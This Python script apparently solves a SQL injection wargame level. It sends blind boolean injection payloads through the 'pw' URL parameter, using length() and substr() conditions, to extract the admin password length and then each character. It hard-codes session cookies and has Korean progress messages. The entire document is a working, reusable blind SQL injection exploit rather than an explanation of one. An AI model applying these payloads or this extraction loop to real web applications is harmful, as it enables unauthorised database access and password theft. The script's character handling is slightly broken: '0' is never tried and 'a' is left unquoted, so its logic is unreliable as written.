import requests

pw_length = 0
pw = ''
url = 'https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php'
possible = [i for i in range(1, 10)] + [chr(i) for i in range(ord('a'), ord('z')+1)]
cookies = {'PHPSESSID': '3t38beb14phghl6lep6f86ems4', '__cfduid': 'd242d1b31e55a72f0891f924d39e400511592788190'}
# 쿠키는 개발자도구(F12)에 저장된 쿠키의 이름과 값을 딕셔너리로 가져옴

for i in range(100):
    if requests.get(url + f"?pw=' or length(pw)={i} -- '", cookies=cookies).text.count('Hello admin'):
        pw_length = i
        break
    else:
        print(f"{i} 은 아닌가벼...")
print(f'#### 찾았다! 비밀번호의 길이 : {pw_length}개')

for i in range(1, pw_length+1):
    print(f"#### {i}번째 위치의 비밀번호 ")

    for j in possible:
        jj = "'" + j + "'" if ord(str(j)) > ord('a') else j
        if requests.get(url + f"?pw=' or id='admin' and substr(pw, {i}, 1)={jj} -- '", cookies=cookies).text.count('Hello admin'):
            print(f"#### 찾았다! {i}번째 위치의 비밀번호 문자 : {j}")
            pw += str(j)
            break
        else:
            print(f"{j} 은 아닌가벼...")

print("최종 비밀번호 :", pw)
